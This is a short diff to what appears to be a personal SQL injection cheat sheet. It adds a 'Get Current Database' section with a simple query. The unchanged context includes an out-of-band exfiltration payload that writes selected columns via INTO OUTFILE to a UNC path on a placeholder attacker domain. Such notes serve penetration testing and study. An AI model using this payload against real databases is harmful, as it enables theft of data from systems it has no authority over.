@@ -126,6 +126,14 @@ SELECT $COLUMNS_TO_EXFIL INTO OUTFILE '\\\\$YOUR_SUBDOMAIN.$YOUR_DOMAIN\\a'
 
 ---
 
+## Get Current Database
+
+```sql
+SELECT database();
+```
+
+---
+
 ## Table enumeration
 
 [[database-enumeration#Querying database tables non-Oracle]]
